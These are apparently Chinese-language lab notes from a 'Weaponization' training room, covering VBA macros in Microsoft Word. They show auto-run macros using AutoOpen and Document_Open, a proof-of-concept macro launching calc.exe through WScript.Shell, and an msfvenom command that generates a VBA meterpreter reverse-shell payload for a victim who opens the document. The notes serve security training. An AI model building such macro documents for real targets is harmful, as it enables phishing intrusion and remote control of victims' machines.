VBA 代表 Visual Basic for Applications，是 Microsoft 为 Microsoft Word、Excel、PowerPoint 等 Microsoft 应用程序实现的一种编程语言。VBA 编程允许自动执行用户与 Microsoft Office 应用程序之间几乎所有键盘和鼠标交互的任务。
宏是 Microsoft Office 应用程序，其中包含以 Visual Basic for Applications (VBA) 编程语言编写的嵌入式代码。它用于创建自定义函数，通过创建自动化流程来加速手动任务。 VBA 的功能之一是访问 Windows 应用程序编程接口 (API) 和其他低级功能。
现在创建一个新的空白 Microsoft 文档来创建我们的第一个宏。目标是讨论该语言的基础知识并展示如何在打开 Microsoft Word 文档时运行它。首先，我们需要通过选择“视图”→“宏”来打开 Visual Basic 编辑器。宏窗口显示在文档中创建我们自己的宏。
![[Pasted image 20240507170138.png]]
在宏名称部分，我们选择将宏命名为 THM。请注意，我们需要从列表 Document1 中的宏中进行选择，最后选择创建。接下来，Microsoft Visual Basic for Application 编辑器显示我们可以在哪里编写 VBA 代码。让我们尝试显示一个消息框，其中包含以下消息：欢迎来到武器化室！。我们可以使用 MsgBox 函数来做到这一点，如下所示：
```javascript
Sub THM()
  MsgBox ("Welcome to Weaponization Room!")
End Sub
```
按 F5 或 Run → Run Sub/UserForm 运行宏.
现在，为了在文档打开后自动执行 VBA 代码，我们可以使用内置函数，例如 AutoOpen 和 Document_open。请注意，我们需要指定文档打开后需要运行的函数名称，在我们的例子中是 THM 函数。
```javascript
Sub Document_Open()
  THM
End Sub

Sub AutoOpen()
  THM
End Sub

Sub THM()
   MsgBox ("Welcome to Weaponization Room!")
End Sub
```
需要注意的是，为了使宏起作用，我们需要将其保存为启用宏的格式，例如.doc和docm。现在，让我们将文件另存为 Word 97-2003 模板，其中通过转到文件 → 保存 Document1 并保存为类型 → Word 97-2003 文档启用宏，最后保存。
让我们关闭保存的Word文档。如果我们重新打开文档文件，Microsoft Word 将显示一条安全消息，指示宏已被禁用，并为我们提供启用它的选项。让我们启用它并继续检查结果。
**![[Pasted image 20240507170240.png]]
![[Pasted image 20240507170250.png]]
现在编辑 Word 文档并创建一个宏函数来执行 calc.exe 或任何可执行文件作为概念证明，如下所示，
```javascript
Sub PoC()
	Dim payload As String
	payload = "calc.exe"
	CreateObject("Wscript.Shell").Run payload,0
End Sub
```
为了详细解释代码，我们使用 Dim 关键字将有效负载变量声明为字符串。使用payload =“calc.exe”，我们指定有效负载名称，最后使用CreateObject(“Wscript.Shell”).Run有效负载，我们创建一个Windows脚本主机(WSH)对象并运行有效负载。请注意，如果要重命名函数名称，则也必须在 AutoOpen() 和 Document_open() 函数中包含函数名称。
值得一提的是，我们可以将 VBA 与之前介绍的方法（例如 HTA 和 WSH）结合起来。 VBA/宏本身不会绕过任何检测。

我们使用 msfvenom 创建 meterpreter 有效负载。我们需要指定 PayloadLHOST 和 LPORT，它们与 Metasploit 框架中的内容相匹配。请注意，我们将有效负载指定为 VBA 以将其用作宏。
```
user@AttackBox$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder specified, outputting raw payload Payload size: 341 bytes Final size of vba file: 2698 bytes
```
导入时请注意，需要进行一项修改才能使其工作。输出将在 MS Excel 工作表上运行。因此，将 Workbook_Open() 更改为 Document_Open() 以使其适合 MS Word 文档。
一旦恶意 MS Word 文档在受害计算机上打开，我们应该会收到反向 shell。
